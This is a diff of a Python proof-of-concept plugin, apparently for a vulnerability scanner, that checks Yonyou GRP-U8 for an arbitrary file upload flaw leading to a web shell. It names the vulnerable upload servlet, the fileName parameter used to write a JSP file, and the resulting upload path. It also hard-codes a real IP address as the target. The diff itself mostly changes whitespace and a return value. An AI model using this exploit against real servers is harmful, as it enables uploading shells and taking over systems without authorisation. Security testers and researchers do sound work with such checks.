@@ -2,16 +2,16 @@
 #-*-:coding:utf-8 -*-
 
 #Author:wonderkun
-#Name: 用友 GRP-u8系统任意文件上传，可getshell  
+#Name: 用友 GRP-u8系统任意文件上传，可getshell
 
 #Refer:http://www.wooyun.org/bugs/wooyun-2010-0111404
-#Data:2016/1/27  
+#Data:2016/1/27
 
 '''
-任意文件上传  /servlet/FileUpload?fileName=test.jsp&actionID=update  
+任意文件上传  /servlet/FileUpload?fileName=test.jsp&actionID=update
 
-本地构造表单 
-上传后的路径是：/R9iPortal/upload/+fileName参数的值     
+本地构造表单
+上传后的路径是：/R9iPortal/upload/+fileName参数的值
 
 '''
 
@@ -41,8 +41,8 @@ Cookie: JSESSIONID=3D2A49AAB839B03E25A57806A2AB773C
     code,head,res,errcode,finalurl=curl.curl2(verify_url)
     if code==200 and "testvul" in res:
         security_hole('任意文件上传 '+vun_url)
+        return arg
 
 if  __name__=="__main__":
     from dummy import *
     audit(assign('yongyou_u8','http://125.67.66.250:801/')[1])
-    # audit(assign('yongyou_u8','http://124.128.96.98:8001/')[1])
